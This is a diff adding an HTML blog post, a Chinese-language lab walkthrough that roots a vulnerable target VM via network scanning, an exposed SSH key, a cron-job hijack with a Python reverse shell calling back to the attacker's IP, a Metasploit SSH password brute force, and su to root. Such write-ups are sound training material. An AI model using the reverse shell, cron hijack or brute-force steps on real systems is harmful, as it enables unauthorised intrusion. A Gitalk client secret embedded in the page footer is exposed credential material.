@@ -1,0 +1,297 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>SSH-服务渗透root主机 | MokYan</title>
+<link rel="shortcut icon" href="https://M0kY4n.github.io111/favicon.ico?v=1625225841143">
+<link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.css" rel="stylesheet">
+<link rel="stylesheet" href="https://M0kY4n.github.io111/styles/main.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/go.min.js"></script>
+<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+        crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+        crossorigin="anonymous"></script>
+
+<!-- DEMO JS -->
+<script src="media/scripts/index.js"></script>
+
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            MokYan
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+    </div>
+</nav>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    SSH-服务渗透root主机
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-04-01 ·
+                    </time>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/kKgXiNMfp/" class="post-tags">
+                            # SSH
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/ZMmksdGOR_/" class="post-tags">
+                            # msfconsole
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/ov9f1l9vPE/" class="post-tags">
+                            # Web安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="0x00-环境配置">0x00 环境配置</h2>
+<ol>
+<li>SSH-服务渗透root主机靶机</li>
+<li>Kali 攻击机</li>
+<li>靶机与攻击机处于同一网段</li>
+</ol>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<ol>
+<li>
+<p>寻找靶机IP</p>
+<p>由于Kali与靶机在统一网段 , 所以直接扫Kali IP所在的网段 , 使用netdiscover进行扫描</p>
+<pre><code class="language-shell">netdiscover 10.112.132.0/24
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/netdiscover.jpg" alt="netdiscover" loading="lazy"></figure>
+</li>
+<li>
+<p>扫描靶机服务</p>
+<p>得知靶机的IP后 , 使用nmap进行服务扫描 , <a href="https://mokyan.github.io/post/nmap-xue-xi-shou-ce/">nmap学习手册</a>传送门</p>
+<pre><code class="language-shell">nmap -A -T4 10.112.132.18
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-nmap-A.jpg" alt="nmap-A" loading="lazy"></figure>
+</li>
+</ol>
+<p>3.访问端口服务</p>
+<p>​	从扫描结果中发现80端口 , 访问80端口 , 通过wappalyzer , 确定是一个静态HTML页面 , 中间件为Apache , 系统为Debian , 页面有几个 人名 与 邮箱</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/about-Us.jpg" alt="人名与邮箱" loading="lazy"></p>
+<p>​	通过nmap扫描结果和robots.txt内容 , 得到<code>/wordpress-blog</code>和<code>/files</code>两个目录 , 一个为空 , 一个访问得到 <code>YOU JUST GOT TROLLED</code> 淦...</p>
+<p>​	继续深度查找 , 进行目录爆破 , 使用 <code>dirsearch</code>进行目录爆破 <a href="https://github.com/maurosoria/dirsearch">dirsearch传送门</a></p>
+<pre><code class="language-shell">python3 dirsearch.py -u http://10.112.132.18 
+</code></pre>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dirsearch.jpg" alt="dirsearch" loading="lazy"></p>
+<p>​	dirsearch 扫描结果发现一个名为 <code>icons</code> 的目录 , 访问目录 , 发现一个奇怪的txt文件 , 打开竟是一个SSH的密钥文件</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/txtfile.jpg" alt="txtfile" loading="lazy"></p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Key.jpg" alt="SSH-KEY" loading="lazy"></p>
+<p>​	得到SSH密钥 , 结合之前拿到的人名和邮箱 , 尝试进行SSH登录</p>
+<h2 id="0x02-ssh登录">0x02 SSH登录</h2>
+<pre><code class="language-shell">ssh -i Key_File Username@Host
+</code></pre>
+<p>使用人名登录 , 只有 martin 是可以登录 , 且密码为空 , 回车就能直接进去 !</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Login.jpg" alt="SSH-Login" loading="lazy"></figure>
+<p>查看了权限 , 不是root的 , 需要提权 , <a href="https://zhuanlan.zhihu.com/p/341658060">linux提权常用方式</a></p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-id.jpg" alt="SSH-id" loading="lazy"></figure>
+<p>查看计划任务 , 发现 <strong>jimmy</strong> 创建了一个每5分钟就执行一次的Python文件 <strong>sekurity.py</strong> 的计划任务</p>
+<pre><code class="language-shell">cat /etc/crontab
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/crontab.jpg" alt="crontab" loading="lazy"></figure>
+<p>查看这个Python文件 , 发现不存在 ! 可以向此处进行反弹shell , 查看是否具有更高的权限</p>
+<pre><code class="language-shell">martin@debian:~$ cat /tmp/sekurity.py
+cat: /tmp/sekurity.py: Aucun fichier ou dossier de ce type
+martin@debian:~$ 
+
+</code></pre>
+<p>创建sekurity.py文件 , 编写脚本</p>
+<pre><code class="language-shell">#创建脚本
+vi /tmp/sekurity.py
+
+#编辑脚本
+#!/usr/bin/python
+import os,socket,subprocess
+s=socket.socket()
+s.connect((&quot;10.112.132.16&quot;,25565)   #攻击机IP，攻击机监听端口（任意空闲端口）
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+
+# ESC -&gt; 冒号 -&gt; wq 保存退出
+# 添加执行权限
+chmod +x /tmp/sekurity.py
+</code></pre>
+<p>在攻击机上面开启监听 , 每5分钟执行一次 , 耐心等待</p>
+<pre><code class="language-shell">nc -lvp 25565
+</code></pre>
+<p>连接成功 , 用户<strong>jimmy</strong>依旧不是 root权限</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/shell-id.jpg" alt="shell-id" loading="lazy"></figure>
+<h2 id="0x03-ssh爆破">0x03 SSH爆破</h2>
+<p>没办法,只能爆破最后一个用户 <strong>hadi</strong> , 使用品轩字典创建一个字典 , 在网上已经有人跑出来密码为 &quot;hadi123&quot; , 所以我们创建范围 hadi100-hadi199 , 主要介绍爆破方法 !</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/create-dist.jpg" alt="create-dist" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dist.jpg" alt="dist" loading="lazy"></figure>
+<p>使用 <strong>msfconsole</strong> , 进行SSH爆破</p>
+<pre><code class="language-shell">msfconsole
+
+search ssh	#搜索ssh爆破的脚本
+#auxiliary/scanner/ssh/ssh_login 这个就是ssh登录爆破的脚本
+
+use auxiliary/scanner/ssh/ssh_login		#使用脚本
+show options	#显示选项
+
+set rhosts 10.112.132.19	#设置靶机ip
+set username hadi	#设置用户名	
+set pass_file /home/mokyan/桌面/password.txt	#设置密码
+set threads 10	#设置线程
+set verbose true	#设置输出详细信息
+
+#设置完毕 , run运行
+run
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-options.jpg" alt="msfconsole-options" loading="lazy"></figure>
+<p>爆破成功 , 提示一个会话打开</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-run.jpg" alt="msfconsole-run" loading="lazy"></figure>
+<p>打开会话,并优化shell</p>
+<pre><code class="language-shell">session -i 1
+
+python -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-shell.jpg" alt="msfconsole-shell" loading="lazy"></figure>
+<p>使用su 切换root , 密码经过尝试为hadi123 , 在root目录下找到 flag.txt</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/flag.jpg" alt="flag" loading="lazy"></figure>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://M0kY4n.github.io111/post/nmap-xue-xi-shou-ce/" class="post-title gt-a-link">
+                    Nmap 学习手册
+                </a>
+            </div>
+        
+
+        
+            
+                <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '33314f7248b5c9af3dd7',
+    clientSecret: 'a00f05259046ad817d64c59027a0388812fe40b7',
+    repo: 'MokYan.github.io',
+    owner: 'MokYan',
+    admin: ['MokYan'],
+    id: location.pathname,      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">The more you know, the more you don't know</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+                <a href="https://weibo.com/2125865220/profile?topnav=1&amp;wvr=6" target="_blank">
+                    <i class="fab fa-weibo gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://www.zhihu.com/people/damo-18-66" target="_blank">
+                    <i class="fab fa-zhihu gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+    </div>
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a href="https://M0kY4n.github.io111/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+    hljs.initHighlightingOnLoad()
+</script>
+
+
+    </div>
+</div>
+</body>
+</html>
